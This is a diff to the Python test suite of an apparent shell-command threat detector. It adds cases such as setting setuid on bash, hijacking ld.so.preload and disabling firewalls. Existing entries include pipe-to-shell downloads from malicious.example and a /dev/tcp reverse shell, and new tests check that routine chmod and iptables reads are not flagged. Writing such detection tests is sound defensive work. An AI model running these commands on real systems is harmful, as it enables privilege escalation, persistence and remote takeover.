@@ -42,6 +42,11 @@ grep -rIl --include="*.php" -E "eval\\(|base64_decode\\(|shell_exec\\(" $WP | he
 
 # Each attack paired with the indicator it must match.
 ATTACK_COMMANDS = [
+    ("/usr/bin/chmod u+s /bin/bash", "setuid_bit"),
+    ("/usr/bin/chmod 4755 /tmp/sh", "setuid_bit"),
+    ("/usr/bin/bash -c echo /tmp/libhook.so > /etc/ld.so.preload", "preload_hijack"),
+    ("/usr/sbin/iptables -F", "firewall_disabled"),
+    ("/usr/sbin/ufw disable", "firewall_disabled"),
     ("/usr/bin/curl -s http://malicious.example/x.sh | bash", "pipe_to_interpreter"),
     ("/usr/bin/wget -qO- http://malicious.example/i.sh | sh", "remote_fetch"),
     ("/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "raw_socket_redirect"),
@@ -195,3 +200,14 @@ def test_review_indicator_set_is_configurable() -> None:
     assert parse_critical_indicators(None, default=DEFAULT_REVIEW_INDICATORS) == (
         DEFAULT_REVIEW_INDICATORS
     )
+
+
+@pytest.mark.parametrize("command", [
+    "/usr/bin/chmod 644 /etc/nginx/nginx.conf",
+    "/usr/bin/chmod 0755 /opt/app/run.sh",
+    "/usr/bin/chmod -R u+rw /srv/data",
+    "/usr/sbin/iptables -L -n",
+])
+def test_routine_permission_and_firewall_reads_are_not_flagged(command: str) -> None:
+    flagged = set(match_indicators(command)) & {"setuid_bit", "firewall_disabled"}
+    assert not flagged
